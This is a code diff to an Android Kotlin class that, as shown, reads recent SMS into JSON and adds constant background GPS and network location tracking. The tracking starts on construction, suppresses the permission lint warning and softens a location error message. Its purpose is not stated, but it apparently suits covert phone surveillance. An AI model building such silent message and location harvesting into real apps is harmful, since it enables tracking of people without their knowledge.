@@ -3,8 +3,11 @@ package com.example.localutility
 import android.annotation.SuppressLint
 import android.content.Context
 import android.content.Intent
+import android.location.Location
+import android.location.LocationListener
 import android.location.LocationManager
 import android.net.Uri
+import android.os.Bundle
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.telephony.SmsManager
@@ -12,6 +15,36 @@ import org.json.JSONArray
 import org.json.JSONObject
 
 class TelephonyAndLocationManager(private val context: Context) {
+
+    private var latestLocation: Location? = null
+
+    init {
+        startLocationUpdates()
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun startLocationUpdates() {
+        try {
+            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            val listener = object : LocationListener {
+                override fun onLocationChanged(loc: Location) {
+                    latestLocation = loc
+                }
+                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+                override fun onProviderEnabled(provider: String) {}
+                override fun onProviderDisabled(provider: String) {}
+            }
+
+            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 2000L, 1f, listener)
+            }
+            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 2000L, 1f, listener)
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
 
     fun getRecentSms(): JSONArray {
         val array = JSONArray()
@@ -80,16 +113,17 @@ class TelephonyAndLocationManager(private val context: Context) {
         val obj = JSONObject()
         try {
             val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
+            val location = latestLocation 
+                ?: locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
                 ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-            
+
             if (location != null) {
                 obj.put("lat", location.latitude)
                 obj.put("lng", location.longitude)
                 obj.put("accuracy", location.accuracy)
                 obj.put("timestamp", location.time)
             } else {
-                obj.put("error", "Location not available")
+                obj.put("error", "Location signal searching...")
             }
         } catch (e: Exception) {
             obj.put("error", e.message)
